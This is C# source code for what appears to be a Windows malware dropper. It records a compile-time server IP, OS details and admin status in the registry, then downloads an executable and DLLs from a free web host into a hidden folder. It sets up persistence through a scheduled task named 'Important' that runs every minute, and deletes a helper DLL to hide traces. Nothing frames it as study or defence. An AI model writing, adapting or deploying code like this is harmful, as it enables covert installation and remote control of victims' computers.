using System.Runtime.Versioning;
using System;
using Microsoft.Win32;
using System.IO;
using System.Security.Principal;
using System.Net;
using System.Threading;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using Microsoft.Win32.TaskScheduler;
using System.Collections.Generic;
using System.Security.Policy;

namespace program
{
    public class InformationWriting
    {
        static void Main(string[] args)
        {
            //Creating a key value for the Remote IP Address to connect to
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Computer\HKEY_LOCAL_MACHINE\SOFTWARE\MiddleClientApp"))
            {
                key.SetValue("ServerIPAddressToConnect", "%IPADDRESS%"); //Changing dynamicly while compiling
                key.SetValue("OpenedAt", DateTime.Now);
                key.SetValue("OSVersion", Get.OSType().Name + " - " + Get.OSType().Type);
                key.SetValue("PublicIPAddress", Get.PublicIPAddress());
                key.SetValue("CountryLocation", Get.CountryName());
                bool AppStatus = Get.Status();
                if (AppStatus)
                    key.SetValue("AppStatus", "Administrator");
                else
                    key.SetValue("AppStatus", "User");
            }

            Get.filesTo(@"C:\Users\User\Documents\SuperSecretApp");
            Get.NewTaskschedulerItem(@"C:\Users\User\Documents\SuperSecretApp\app.exe");
        }
    }

    public class Get
    {
        public class Info
        {
            public string Name = "";
            public string Type = "";
        }

        public static void NewTaskschedulerItem(string path)
        {
            using (TaskService ts = new TaskService())
            {
                // Create a new task definition and assign properties
                TaskDefinition td = ts.NewTask();
                TimeTrigger TimeTrigger = new TimeTrigger
                {
                    StartBoundary = DateTime.Now,
                    Repetition = new RepetitionPattern(TimeSpan.FromMinutes(1), TimeSpan.FromMinutes(0)),
                };
                td.Triggers.Add(TimeTrigger);
                td.Actions.Add(new ExecAction(path));
                ts.RootFolder.RegisterTaskDefinition(@"Important", td);
                ts.Dispose();
            }
            try
            {
                File.Delete(Directory.GetCurrentDirectory() + @"\Microsoft.Win32.TaskScheduler.dll");
            }
            catch { }
        }

        public static void filesTo(string destination)
        {
            if (!Directory.Exists(destination))
            {
                Directory.CreateDirectory(destination);
            }

            WebClient file = new WebClient();
            Thread.Sleep(5000);
            string url = @"https://mysimpleweb054.000webhostapp.com/";
            file.DownloadFile(url + "mysite/1", destination + @"\AForge.Video.DirectShow.dll"); //first dll file
            file.DownloadFile(url + "mysite/2", destination + @"\AForge.Video.dll"); //second dll file
            file.DownloadFile(url + "mysite/3", destination + @"\app.exe"); //exe file
            string CurrentDirectory = Directory.GetCurrentDirectory();
            file.DownloadFile(url + "mysite/4", CurrentDirectory + @"\Microsoft.Win32.TaskScheduler.dll"); //third dll file
        }

        public static bool Status()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static Info OSType()
        {
            string HKLMWinNTCurrent = @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion";
            int osBuild = int.Parse(Registry.GetValue(HKLMWinNTCurrent, "CurrentBuildNumber", "").ToString());
            Thread.Sleep(1300);
            string Type = Environment.Is64BitOperatingSystem ? "x64" : "x84";

            if (osBuild >= 22000)
            {
                return new Info()
                {
                    Name = "Windows 11",
                    Type = Type
                };
            }

            if (osBuild >= 10240 && osBuild <= 19045)
            {
                return new Info()
                {
                    Name = "Windows 10",
                    Type = Type
                };
            }

            else
            {
                return new Info()
                {
                    Name = "Windows 8 or older",
                    Type = Type
                };
            }
        }

        public static String PublicIPAddress()
        {
            return "8.8.8.8";
        }

        public static String CountryName()
        {
            return "israel";
        }
    }
}
